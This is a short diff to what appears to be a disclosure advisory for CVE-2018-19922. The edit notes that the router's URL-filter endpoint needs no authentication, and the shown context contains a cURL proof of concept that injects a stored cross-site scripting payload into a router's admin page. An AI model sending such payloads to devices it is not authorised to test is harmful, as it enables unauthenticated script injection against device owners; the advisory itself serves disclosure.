@@ -8,7 +8,7 @@
 **CVE**: [CVE-2018-19922](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19922)
 
 ## Verification:
-1. Make an HTTP request to the router where 192.168.0.1 is the router's local IP address, for example with this cURL POC:
+1. Make an HTTP request to the router where 192.168.0.1 is the router's local IP address, for example with this cURL POC (no authentication is needed in the cURL request):
 ```
 curl "http://192.168.0.1/urlfilter.cmd?action=set_url&TodUrlAdd=<img+src=x+onerror=\"alert(String.fromCharCode(88,83,83))\"/>&Lan_IP=192.168.0.2&listtype=Exclude" -X POST
 ```
